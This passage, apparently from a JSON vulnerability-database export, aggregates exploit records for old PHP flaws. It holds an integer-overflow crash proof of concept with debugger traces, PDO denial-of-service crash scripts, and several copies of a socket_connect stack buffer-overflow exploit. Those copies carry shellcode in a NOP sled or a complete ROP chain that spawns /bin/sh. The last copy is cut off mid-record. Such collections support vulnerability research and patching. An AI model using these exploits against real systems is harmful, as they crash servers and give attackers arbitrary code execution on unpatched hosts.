SIGNATURE-----\r\n\r\niQIcBAEBAgAGBQJNAi5vAAoJEIO8+dzW5bUwsdsP/3/XRI/fXcqRg154DObVa/Ew\r\nLgVS9ZP5yrTG2JBZnYYSHRB6ZXpK7hEfM838/gVLAolMEnLplynqmiTef74gHBAN\r\n/VIGpE7sZDsxTeAk+MWzecxS0Gp77kR8ibcd8kClKmdcodgZ+JSJab/3snAclBXT\r\nCesuN20tUPS4d7sjxTz7K9uZhO+7ezZn6xnJr67l2xcx8xCcrnNNRzapEzQ6tcBj\r\ncM3pMxond3uAGQT3+ewwl1GQ/30HkX3fjPJPhT6Mna9/LH7f5IGHSnSxw5lJbUjY\r\nxMaB+qTE44TrKTKqKkkowsPpAeaoQ7a3O16YG6qcWfly+9bf2vQVNhcG+hAa6mgK\r\nekNkleDKg+n7Qsgsrl/4mFS/40tCTss9/PQ8/QEp2g4VOSeyzuoVB2PJDl48X4pH\r\nxabNVh9T3LWkxTnC5wcy2tuF7Tbb1eOngMxBclB9xR6vjr0nqT5EHLy4w+VnXo3I\r\nFICv2EhojYXpxgrQEteK0JVnZC3ROspAJDM7YC4ZXk4HSRKnFK2Ymf+yyzhycyHu\r\ncj1F70DTCNvXfdWUuvKVlTQUM4BDGpR1xs23EZqVky+8lk1mRJW98UwCs0kqpN46\r\nmaS8ZXM1+8dEMZFx/2wRcI2xkFoViMuKFpqwvVG+TPYY0fUSUfNdYCoxxl4YiWdD\r\nu0SjiF38TxqaIjNnvaym\r\n=3G4F\r\n-----END PGP SIGNATURE-----",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:15722"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2010-12-10T00:00:00",
            "published": "2010-12-10T00:00:00",
            "href": "https://packetstormsecurity.com/files/96615/PHP-5.3.3-Integer-Overflow.html",
            "id": "PACKETSTORM:96615",
            "type": "packetstorm",
            "title": "PHP 5.3.3 Integer Overflow",
            "sourceData": "`-----BEGIN PGP SIGNED MESSAGE-----  \nHash: SHA1  \n  \n[ PHP 5.3.3 NumberFormatter::getSymbol Integer Overflow ]  \n  \nAuthor: Maksymilian Arciemowicz  \nhttp://securityreason.com/  \nhttp://cxib.net/  \nDate:  \n- - Dis.: 11.11.2010  \n- - Pub.: 10.12.2010  \n  \nCERT: VU#479900  \nCVE: CVE-2010-4409  \nCWE: CWE-189  \nStatus: Fixed in PHP 5.3.4  \n  \nAffected Software:  \n- - PHP 5.3.3  \n  \nOriginal URL:  \nhttp://securityreason.com/achievement_securityalert/91  \n  \n  \n- --- 0.Description ---  \nInternationalization extension (further is referred as Intl) is a wrapper for ICU library, enabling PHP programmers to perform UCA-conformant collation and date/time/number/currency formatting in their scripts.  \n  \nNumber Formatter: allows to display number according to the localized format or given pattern or set of rules, and to parse strings into numbers.   \n  \n  \n- --- 1. PoC for Integer Overflow ---  \n$nx=new NumberFormatter(\"pl\",1);  \n$nx->getSymbol(2147483648);  \n  \n  \n- --- 2. PHP 5.3.3/5.2.14 NumberFormatter::getSymbol Integer Overflow ---  \nAs we can see in  \n  \n- ---  \nPHP_FUNCTION( numfmt_get_symbol )  \n{  \nlong symbol;  \nUChar value_buf[4];  \nUChar *value = value_buf;  \nint length = USIZE(value);  \nFORMATTER_METHOD_INIT_VARS;  \n  \n/* Parse parameters. */  \nif( zend_parse_method_parameters( ZEND_NUM_ARGS() TSRMLS_CC, getThis(),  \n\"Ol\",  \n&object, NumberFormatter_ce_ptr, &symbol ) == FAILURE )  \n{  \nintl_error_set( NULL, U_ILLEGAL_ARGUMENT_ERROR,  \n\"numfmt_get_symbol: unable to parse input params\", 0 TSRMLS_CC );  \n  \nRETURN_FALSE;  \n}  \n  \n/* Fetch the object. */  \nFORMATTER_METHOD_FETCH_OBJECT;  \n  \nlength = unum_getSymbol(FORMATTER_OBJECT(nfo), symbol, value_buf,  \nlength, &INTL_DATA_ERROR_CODE(nfo)); <================= !!!TO BIG INT HERE!!!  \n...  \n- ---  \n  \nwill crash for differ value. example {2444492804, 2147483648,  \n2147483649, 2554462209} (when rdi out off band (range 2to31 2to32 under 64bits linux)  \n  \nProgram received signal SIGSEGV, Segmentation fault.  \n0x00007fffedf317f5 in icu_4_2::UnicodeString::extract(unsigned short*,  \nint, UErrorCode&) const () from /usr/lib/libicuuc.so.42  \n(gdb) bt  \n#0 0x00007fffedf317f5 in icu_4_2::UnicodeString::extract(unsigned  \nshort*, int, UErrorCode&) const () from /usr/lib/libicuuc.so.42  \n#1 0x00007fffee5d11c0 in zif_numfmt_get_symbol (ht=17168120,  \nreturn_value=0x105c928, return_value_ptr=0x4, this_ptr=0x105f710,  \nreturn_value_used=17168144)  \nat /build/buildd/php5-5.3.3/ext/intl/formatter/formatter_attr.c:269  \n...blabla  \n  \nrip 0x7fffedf317f5 0x7fffedf317f5  \n<icu_4_2::UnicodeString::extract(unsigned short*, int, UErrorCode&)  \nconst+21>  \neflags 0x10206 [ PF IF RF ]  \n  \nlet`s see value ~4294901761  \n  \n$nx=new NumberFormatter(\"pl\",1);  \n$nx->getSymbol(4294901761);  \n  \nwill crash in memcpy(3) ;]  \n  \nProgram received signal SIGSEGV, Segmentation fault.  \nmemcpy () at ../sysdeps/x86_64/memcpy.S:90  \n90 ../sysdeps/x86_64/memcpy.S: No such file or directory.  \nin ../sysdeps/x86_64/memcpy.S  \n(gdb) bt  \n#0 memcpy () at ../sysdeps/x86_64/memcpy.S:90  \n#1 0x00007fffea74a86a in icu_4_2::UnicodeString::extract(unsigned  \nshort*, int, UErrorCode&) const () from /usr/lib/libicuuc.so.42  \n#2 0x00007fffeadea2b4 in zif_numfmt_get_symbol (ht=17826952,  \nreturn_value=0x10fecd0, return_value_ptr=0xc, this_ptr=0x11004a0,  \nreturn_value_used=17826976)  \nat /build/buildd/php5-5.3.3/ext/intl/formatter/formatter_attr.c:274  \n#3 0x00000000006e986a in zend_do_fcall_common_helper_SPEC (  \nexecute_data=0x7ffff7eb8068)  \nat /build/buildd/php5-5.3.3/Zend/zend_vm_execute.h:316  \n...  \n  \nlet's see ICU UnicodeString::extract(unsigned short*, int, UErrorCode&)  \n  \n- ---  \nint32_t  \nUnicodeString::extract(UChar *dest, int32_t destCapacity,  \nUErrorCode &errorCode) const {  \nint32_t len = length();  \nif(U_SUCCESS(errorCode)) {  \nif(isBogus() || destCapacity<0 || (destCapacity>0 && dest==0)) {  \nerrorCode=U_ILLEGAL_ARGUMENT_ERROR;  \n} else {  \nconst UChar *array = getArrayStart();  \nif(len>0 && len<=destCapacity && array!=dest) {  \nuprv_memcpy(dest, array, len*U_SIZEOF_UCHAR); <======= MEMCPY REFERENCE HERE  \n}  \nreturn u_terminateUChars(dest, destCapacity, len, &errorCode);  \n}  \n}  \n  \nreturn len;  \n  \n}  \n- ---  \n  \nso crash in rip=memcpy(3).   \n  \nMethod getLocal() also can generate simple crash (CWE-170)  \n  \n$nx=new IntlDateFormatter(\"pl\", IntlDateFormatter::FULL,  \nIntlDateFormatter::FULL);  \n$nx->getLocale(1);  \n  \n  \n- --- 3. Fix ---  \nFix in next PHP Version 5.3.4:  \nhttp://www.kb.cert.org/vuls/id/479900  \n  \nSVN:  \nhttp://svn.php.net/viewvc/php/php-src/branches/PHP_5_3/ext/intl/dateformat/dateformat_attr.c?view=log  \nhttp://svn.php.net/viewvc/php/php-src/branches/PHP_5_3/ext/intl/formatter/formatter_attr.c?view=log  \n  \n  \n- --- 4. Greets ---  \nSpecial thanks for Pierre Joye and Stas Malyshev for very quickly fix  \nMichael Orlando for security support  \n  \nand sp3x, Infospec  \n  \n  \n- --- 5. Contact ---  \nAuthor: SecurityReason.com [ Maksymilian Arciemowicz ]  \n  \nEmail:  \n- - cxib {a\\./t] securityreason [d=t} com  \n  \nGPG:  \n- - http://securityreason.com/key/Arciemowicz.Maksymilian.gpg  \n  \nhttp://securityreason.com/  \nhttp://cxib.net/  \n-----BEGIN PGP SIGNATURE-----  \n  \niQIcBAEBAgAGBQJNAio1AAoJEIO8+dzW5bUwwxkP/AilUgATowi4jQiNIUcBBuD5  \n3Jvirho7YJMAK4k8EsbGXpPkZ1JmiuE+km3IUHdhkazBO3coUPRNvudZQoG2NbBa  \nUteHQaMzGDPHXy9uR4izxhGHVcpnmpYKG9841OfNBIJ3/EDAn5nBKrNPtO+4brkh  \nvcaglVL4McA+ww4iTbQ7mDLkwmwGsADH0JHrxrCRfB3IzkbaqIueNe//EaSzf9Zy  \n4AUUIOb98jGxGlNVgfEOK1odAQKW+WupyEtuPIy+SYh7ZAi+N/6a17yLcbfEAiWX  \nWKEbSHG0QtleKhiRzEedahfsAzXgct5UB/Clyj5QZn+gsI/hFM+yBdsq9FH2Lnuu  \nHG2JCbMlGrKNxH/vF8tz/kvh/cWF+czmHuisNC4H6XCUmljEV2OLmI9JtRL8qZcs  \npUAcAPVCFF9mGOIOrVbdc4Hku6O/nvXmq/gKashiMbN5SFos/cNh/LxMICHq/HI0  \naS0TX2h+nplNSPQsx+65DSl8SMZyciU9dufcyRTnOIKWwLJfqlSmpwX/gxC1AXJm  \nWVrjw6tGg8wB5iEru4Wl1D3DTlc57kGBFdStPflSooJO+1ZCiz8zfSt0RFLals2N  \nP+lXJzhNox53cAARhbByqIWV+dR/Hrpsjp4ai1kgvgPwI78rJXWKsnEgc3dcntZf  \nBW/ksdPomtWGWej1c4s4  \n=+/YF  \n-----END PGP SIGNATURE-----  \n`\n",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:96615"
        }
    ],
    "CVE-2012-3450": [
        {
            "bulletinFamily": "exploit",
            "description": "PHP 5.4.3 PDO Memory Access Violation Denial of Service Vulnerability. CVE-2012-3450. Dos exploit for php platform",
            "modified": "2012-08-02T00:00:00",
            "published": "2012-08-02T00:00:00",
            "id": "EDB-ID:37566",
            "href": "https://www.exploit-db.com/exploits/37566/",
            "type": "exploitdb",
            "title": "PHP <= 5.4.3 PDO Memory Access Violation Denial of Service Vulnerability",
            "sourceData": "source: http://www.securityfocus.com/bid/54777/info\r\n\r\nPHP is prone to a remote denial-of-service vulnerability.\r\n\r\nAn attacker can exploit this issue to cause the web server to crash, denying service to legitimate users.\r\n\r\nPHP 5.4.3 is vulnerable; other versions may also be affected. \r\n\r\n<?php\r\n try {\r\n $db = new PDO('mysql:host=localhost;dbname=aws', \"root\", \"\");\r\n //tokens: \r\n // SELECT;*;from;'user';/*\r\n //$sql = \"SELECT * from 'user'/*\";\r\n $stmt = $db->prepare(\"SELECT * from 'user'\".mysql_real_escape_string($_GET['query']));\r\n $stmt->execute();\r\n //crash\r\n $stmt->bindColumn(2, $type, PDO::PARAM_STR, 256);\r\n $stmt->fetch(PDO::FETCH_BOUND);\r\n print_r( $type);\r\n }\r\n catch (Exception $e)\r\n {\r\n echo \"Failed: \" . $e->getMessage();\r\n }\r\n ?>\r\n -----\r\n <?php\r\ntry {\r\n$db = new PDO('mysql:host=localhost;dbname=aws', \"root\", \"\");\r\n\r\n//tokens:\r\n// SELECT;*;from;'user';/* \r\n$sql = \":/*\";\r\n\r\n$stmt = $db->prepare($sql);\r\n$stmt->execute();     // crashes php worker in pdo_parse_params()\r\n\r\n$stmt->bindColumn(2, $type, PDO::PARAM_STR, 256);\r\n$stmt->fetch(PDO::FETCH_BOUND);\r\nprint_r( $type);\r\n\r\n} catch (Exception $e) {\r\n  echo \"Failed: \" . $e->getMessage();\r\n}\r\n\r\n?>\r\n---\r\n\r\n<pre>\r\n<?php\r\necho \"hmm beginning\\n\";\r\ntry {\r\n$db = new PDO('mysql:host=localhost;dbname=aws', \"root\", \"\");\r\necho \"lets get it on\\n\";\r\n//tokens:\r\n// SELECT;*;from;'user';/* \r\n$sql = \"SELECT * from user :/**\";\r\necho $sql;\r\n$stmt = $db->prepare($sql);\r\necho \"prepared :)\\n\";\r\nprint_r($stmt);\r\n$stmt->execute();     // crashes php worker in pdo_parse_params()\r\nprint_r($stmt);\r\necho \"executed :(\\n\";\r\n$stmt->bindColumn(2, $type, PDO::PARAM_STR, 256);\r\n$stmt->fetch(PDO::FETCH_BOUND);\r\necho \"--data-\\n\";\r\nprint_r( $type);\r\necho \"--data--\\n\";\r\n\r\n} catch (Exception $e) {\r\n        echo \"EXCEPTION\";\r\n  echo \"Failed: \" . $e->getMessage();\r\n}\r\necho \"hmmm end\\n\";\r\n?>\r\n</pre>\r\n\r\nActual result:\r\n--------------\r\nroot@bt:/opt/lampp# gdb ./bin/php \r\n(gdb) run poc_pdo_linux_short_1.php\r\nStarting program: /opt/lampp/bin/php /opt/lampp/poc_pdo_linux_short_1.php\r\n[Thread debugging using libthread_db enabled]\r\n\r\nProgram received signal SIGSEGV, Segmentation fault.\r\n0x08228a81 in ?? ()\r\n(gdb) bt\r\n#0  0x08228a81 in ?? ()\r\n#1  0x082280eb in pdo_parse_params ()\r\n#2  0x08223891 in ?? ()\r\n#3  0x084b2aad in ?? ()\r\n#4  0x084b1f87 in execute ()\r\n#5  0x08490ed2 in zend_execute_scripts ()\r\n#6  0x0843f13c in php_execute_script ()\r\n#7  0x08506b46 in main ()\r\n\r\n",
            "cvss": {
                "score": 2.6,
                "vector": "AV:NETWORK/AC:HIGH/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:37566"
        }
    ],
    "CVE-2011-1938": [
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2014-07-01T00:00:00",
            "published": "2014-07-01T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-71717",
            "id": "SSV:71717",
            "title": "PHP <= 5.3.5 socket_connect() Buffer Overflow Vulnerability",
            "type": "seebug",
            "sourceData": "\n                                                &#60;?php\r\n// Credit: Mateusz Kocielski, Marek Kroemeke and Filip Palian \r\n// Affected Versions: 5.3.3-5.3.6 \r\n\r\necho &#34;[+] CVE-2011-1938&#34;;\r\necho &#34;[+] there we go...\\n&#34;;\r\ndefine(&#39;EVIL_SPACE_ADDR&#39;, &#34;\\xff\\xff\\xee\\xb3&#34;);\r\ndefine(&#39;EVIL_SPACE_SIZE&#39;, 1024*1024*8);\r\n$SHELLCODE = \r\n        &#34;\\x6a\\x31\\x58\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\\xb0&#34;.\r\n        &#34;\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1&#34;.\r\n        &#34;\\xcd\\x80&#34;;\r\necho &#34;[+] creating the sled.\\n&#34;;\r\n\r\n$CODE = str_repeat(&#34;\\x90&#34;, EVIL_SPACE_SIZE);\r\nfor ($i = 0, $j = EVIL_SPACE_SIZE - strlen($SHELLCODE) - 1 ;\r\n        $i &#60; strlen($SHELLCODE) ; $i++, $j++) {\r\n$CODE[$j] = $SHELLCODE[$i];\r\n}\r\n\r\n$b = str_repeat(&#34;A&#34;, 196).EVIL_SPACE_ADDR;\r\n$var79 = socket_create(AF_UNIX, SOCK_STREAM, 1);\r\necho &#34;[+] popping shell, have fun (if you picked the right address...)\\n&#34;;\r\n$var85 = socket_connect($var79,$b);\r\n?&#62;\n                              ",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:71717"
        },
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2014-07-01T00:00:00",
            "published": "2014-07-01T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-71847",
            "id": "SSV:71847",
            "title": "PHP 5.3.6 - Buffer Overflow PoC (ROP)",
            "type": "seebug",
            "sourceData": "\n                                                &#60;?php\r\n/*\r\n** Jonathan Salwan - @jonathansalwan\r\n** http://shell-storm.org\r\n** 2011-06-04\r\n**\r\n** http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1938\r\n**\r\n** Stack-based buffer overflow in the socket_connect function in ext/sockets/sockets.c\r\n** in PHP 5.3.3 through 5.3.6 might allow context-dependent attackers to execute arbitrary\r\n** code via a long pathname for a UNIX socket.\r\n*/\r\n\r\necho &#34;[+] PHP 5.3.6 Buffer Overflow PoC (ROP)\\n&#34;;\r\necho &#34;[+] CVE-2011-1938\\n\\n&#34;;\r\n\r\n# Gadgets in /usr/bin/php\r\ndefine(&#39;DUMMY&#39;,     &#34;\\x42\\x42\\x42\\x42&#34;); // padding\r\ndefine(&#39;STACK&#39;,     &#34;\\x20\\xba\\x74\\x08&#34;); // .data 0x46a0   0x874ba20\r\ndefine(&#39;STACK4&#39;,    &#34;\\x24\\xba\\x74\\x08&#34;); // STACK + 4\r\ndefine(&#39;STACK8&#39;,    &#34;\\x28\\xba\\x74\\x08&#34;); // STACK + 8\r\ndefine(&#39;STACK12&#39;,   &#34;\\x3c\\xba\\x74\\x08&#34;); // STACK + 12\r\ndefine(&#39;INT_80&#39;,    &#34;\\x27\\xb6\\x07\\x08&#34;); // 0x0807b627: int $0x80\r\ndefine(&#39;INC_EAX&#39;,   &#34;\\x66\\x50\\x0f\\x08&#34;); // 0x080f5066: inc %eax | ret\r\ndefine(&#39;XOR_EAX&#39;,   &#34;\\x60\\xb4\\x09\\x08&#34;); // 0x0809b460: xor %eax,%eax | ret\r\ndefine(&#39;MOV_A_D&#39;,   &#34;\\x84\\x3e\\x12\\x08&#34;); // 0x08123e84: mov %eax,(%edx) | ret\r\ndefine(&#39;POP_EBP&#39;,   &#34;\\xc7\\x48\\x06\\x08&#34;); // 0x080648c7: pop %ebp | ret\r\ndefine(&#39;MOV_B_A&#39;,   &#34;\\x18\\x45\\x06\\x08&#34;); // 0x08064518: mov %ebp,%eax | pop %ebx | pop %esi | pop %edi | pop %ebp | ret\r\ndefine(&#39;MOV_DI_DX&#39;, &#34;\\x20\\x26\\x07\\x08&#34;); // 0x08072620: mov %edi,%edx | pop %esi | pop %edi | pop %ebp | ret\r\ndefine(&#39;POP_EDI&#39;,   &#34;\\x23\\x26\\x07\\x08&#34;); // 0x08072623: pop %edi | pop %ebp | ret\r\ndefine(&#39;POP_EBX&#39;,   &#34;\\x0f\\x4d\\x21\\x08&#34;); // 0x08214d0f: pop %ebx | pop %esi | pop %edi | pop %ebp | ret\r\ndefine(&#39;XOR_ECX&#39;,   &#34;\\xe3\\x3b\\x1f\\x08&#34;); // 0x081f3be3: xor %ecx,%ecx | pop %ebx | mov %ecx,%eax | pop %esi | pop %edi | pop %ebp | ret\r\n\r\n$padd = str_repeat(&#34;A&#34;, 196);\r\n\r\n$payload = POP_EDI.   // pop %edi\r\n           STACK.     // 0x874ba20\r\n           DUMMY.     // pop %ebp\r\n           MOV_DI_DX. // mov %edi,%edx\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           &#34;//bi&#34;.    // pop %ebp\r\n           MOV_B_A.   // mov %ebp,%eax\r\n           DUMMY.     // pop %ebx\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           DUMMY.     // pop %ebp\r\n           MOV_A_D.   // mov %eax,(%edx)\r\n           POP_EDI.   // pop %edi\r\n           STACK4.    // 0x874ba24\r\n           DUMMY.     // pop %ebp\r\n           MOV_DI_DX. // mov %edi,%edx\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           &#34;n/sh&#34;.    // pop %ebp\r\n           MOV_B_A.   // mov %ebp,%eax\r\n           DUMMY.     // pop %ebx\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           DUMMY.     // pop %ebp\r\n           MOV_A_D.   // mov %eax,(%edx)\r\n           POP_EDI.   // pop %edi\r\n           STACK8.    // 0x874ba28\r\n           DUMMY.     // pop %ebp\r\n           MOV_DI_DX. // mov %edi,%edx\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           DUMMY.     // pop %ebp\r\n           XOR_EAX.   // xor %eax,%eax\r\n           MOV_A_D.   // mov %eax,(%edx)\r\n           XOR_ECX.   // xor %ecx,%ecx\r\n           DUMMY.     // pop %ebx\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           DUMMY.     // pop %ebp\r\n           POP_EBX.   // pop %ebx\r\n           STACK.     // 0x874ba20\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           DUMMY.     // pop %ebp\r\n           XOR_EAX.   // xor %eax,%eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INT_80;    // int $0x80\r\n\r\n$evil = $padd.$payload;\r\n\r\n$fd   = socket_create(AF_UNIX, SOCK_STREAM, 1);\r\n$ret  = socket_connect($fd, $evil);\r\n?&#62;\r\n\r\n\n                              ",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:71847"
        },
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2011-07-05T00:00:00",
            "published": "2011-07-05T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-20694",
            "id": "SSV:20694",
            "title": "PHP 5.3.6 Buffer Overflow PoC (ROP) CVE-2011-1938",
            "type": "seebug",
            "sourceData": "\n                                                &lt;?php\r\n/*\r\n** Jonathan Salwan - @shell_storm\r\n** http://shell-storm.org\r\n** 2011-06-04\r\n**\r\n** http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1938\r\n**\r\n** Stack-based buffer overflow in the socket_connect function in ext/sockets/sockets.c\r\n** in PHP 5.3.3 through 5.3.6 might allow context-dependent attackers to execute arbitrary\r\n** code via a long pathname for a UNIX socket.\r\n*/\r\n \r\necho &quot;[+] PHP 5.3.6 Buffer Overflow PoC (ROP)\\n&quot;;\r\necho &quot;[+] CVE-2011-1938\\n\\n&quot;;\r\n \r\n# Gadgets in /usr/bin/php\r\ndefine('DUMMY',     &quot;\\x42\\x42\\x42\\x42&quot;); // padding\r\ndefine('STACK',     &quot;\\x20\\xba\\x74\\x08&quot;); // .data 0x46a0   0x874ba20\r\ndefine('STACK4',    &quot;\\x24\\xba\\x74\\x08&quot;); // STACK + 4\r\ndefine('STACK8',    &quot;\\x28\\xba\\x74\\x08&quot;); // STACK + 8\r\ndefine('STACK12',   &quot;\\x3c\\xba\\x74\\x08&quot;); // STACK + 12\r\ndefine('INT_80',    &quot;\\x27\\xb6\\x07\\x08&quot;); // 0x0807b627: int $0x80\r\ndefine('INC_EAX',   &quot;\\x66\\x50\\x0f\\x08&quot;); // 0x080f5066: inc %eax | ret\r\ndefine('XOR_EAX',   &quot;\\x60\\xb4\\x09\\x08&quot;); // 0x0809b460: xor %eax,%eax | ret\r\ndefine('MOV_A_D',   &quot;\\x84\\x3e\\x12\\x08&quot;); // 0x08123e84: mov %eax,(%edx) | ret\r\ndefine('POP_EBP',   &quot;\\xc7\\x48\\x06\\x08&quot;); // 0x080648c7: pop %ebp | ret\r\ndefine('MOV_B_A',   &quot;\\x18\\x45\\x06\\x08&quot;); // 0x08064518: mov %ebp,%eax | pop %ebx | pop %esi | pop %edi | pop %ebp | ret\r\ndefine('MOV_DI_DX', &quot;\\x20\\x26\\x07\\x08&quot;); // 0x08072620: mov %edi,%edx | pop %esi | pop %edi | pop %ebp | ret\r\ndefine('POP_EDI',   &quot;\\x23\\x26\\x07\\x08&quot;); // 0x08072623: pop %edi | pop %ebp | ret\r\ndefine('POP_EBX',   &quot;\\x0f\\x4d\\x21\\x08&quot;); // 0x08214d0f: pop %ebx | pop %esi | pop %edi | pop %ebp | ret\r\ndefine('XOR_ECX',   &quot;\\xe3\\x3b\\x1f\\x08&quot;); // 0x081f3be3: xor %ecx,%ecx | pop %ebx | mov %ecx,%eax | pop %esi | pop %edi | pop %ebp | ret\r\n \r\n$padd = str_repeat(&quot;A&quot;, 196);\r\n \r\n$payload = POP_EDI.   // pop %edi\r\n           STACK.     // 0x874ba20\r\n           DUMMY.     // pop %ebp\r\n           MOV_DI_DX. // mov %edi,%edx\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           &quot;//bi&quot;.    // pop %ebp\r\n           MOV_B_A.   // mov %ebp,%eax\r\n           DUMMY.     // pop %ebx\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           DUMMY.     // pop %ebp\r\n           MOV_A_D.   // mov %eax,(%edx)\r\n           POP_EDI.   // pop %edi\r\n           STACK4.    // 0x874ba24\r\n           DUMMY.     // pop %ebp\r\n           MOV_DI_DX. // mov %edi,%edx\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           &quot;n/sh&quot;.    // pop %ebp\r\n           MOV_B_A.   // mov %ebp,%eax\r\n           DUMMY.     // pop %ebx\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           DUMMY.     // pop %ebp\r\n           MOV_A_D.   // mov %eax,(%edx)\r\n           POP_EDI.   // pop %edi\r\n           STACK8.    // 0x874ba28\r\n           DUMMY.     // pop %ebp\r\n           MOV_DI_DX. // mov %edi,%edx\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           DUMMY.     // pop %ebp\r\n           XOR_EAX.   // xor %eax,%eax\r\n           MOV_A_D.   // mov %eax,(%edx)\r\n           XOR_ECX.   // xor %ecx,%ecx\r\n           DUMMY.     // pop %ebx\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           DUMMY.     // pop %ebp\r\n           POP_EBX.   // pop %ebx\r\n           STACK.     // 0x874ba20\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           DUMMY.     // pop %ebp\r\n           XOR_EAX.   // xor %eax,%eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INT_80;    // int $0x80\r\n \r\n$evil = $padd.$payload;\r\n \r\n$fd   = socket_create(AF_UNIX, SOCK_STREAM, 1);\r\n$ret  = socket_connect($fd, $evil);\r\n?&gt;\n                              ",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:20694"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP 5.3.6 - Buffer Overflow PoC (ROP). CVE-2011-1938. Local exploits for multiple platform",
            "modified": "2011-07-04T00:00:00",
            "published": "2011-07-04T00:00:00",
            "id": "EDB-ID:17486",
            "href": "https://www.exploit-db.com/exploits/17486/",
            "type": "exploitdb",
            "title": "PHP 5.3.6 - Buffer Overflow PoC ROP",
            "sourceData": "<?php\r\n/*\r\n** Jonathan Salwan - @jonathansalwan\r\n** http://shell-storm.org\r\n** 2011-06-04\r\n**\r\n** http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1938\r\n**\r\n** Stack-based buffer overflow in the socket_connect function in ext/sockets/sockets.c\r\n** in PHP 5.3.3 through 5.3.6 might allow context-dependent attackers to execute arbitrary\r\n** code via a long pathname for a UNIX socket.\r\n*/\r\n\r\necho \"[+] PHP 5.3.6 Buffer Overflow PoC (ROP)\\n\";\r\necho \"[+] CVE-2011-1938\\n\\n\";\r\n\r\n# Gadgets in /usr/bin/php\r\ndefine('DUMMY',     \"\\x42\\x42\\x42\\x42\"); // padding\r\ndefine('STACK',     \"\\x20\\xba\\x74\\x08\"); // .data 0x46a0   0x874ba20\r\ndefine('STACK4',    \"\\x24\\xba\\x74\\x08\"); // STACK + 4\r\ndefine('STACK8',    \"\\x28\\xba\\x74\\x08\"); // STACK + 8\r\ndefine('STACK12',   \"\\x3c\\xba\\x74\\x08\"); // STACK + 12\r\ndefine('INT_80',    \"\\x27\\xb6\\x07\\x08\"); // 0x0807b627: int $0x80\r\ndefine('INC_EAX',   \"\\x66\\x50\\x0f\\x08\"); // 0x080f5066: inc %eax | ret\r\ndefine('XOR_EAX',   \"\\x60\\xb4\\x09\\x08\"); // 0x0809b460: xor %eax,%eax | ret\r\ndefine('MOV_A_D',   \"\\x84\\x3e\\x12\\x08\"); // 0x08123e84: mov %eax,(%edx) | ret\r\ndefine('POP_EBP',   \"\\xc7\\x48\\x06\\x08\"); // 0x080648c7: pop %ebp | ret\r\ndefine('MOV_B_A',   \"\\x18\\x45\\x06\\x08\"); // 0x08064518: mov %ebp,%eax | pop %ebx | pop %esi | pop %edi | pop %ebp | ret\r\ndefine('MOV_DI_DX', \"\\x20\\x26\\x07\\x08\"); // 0x08072620: mov %edi,%edx | pop %esi | pop %edi | pop %ebp | ret\r\ndefine('POP_EDI',   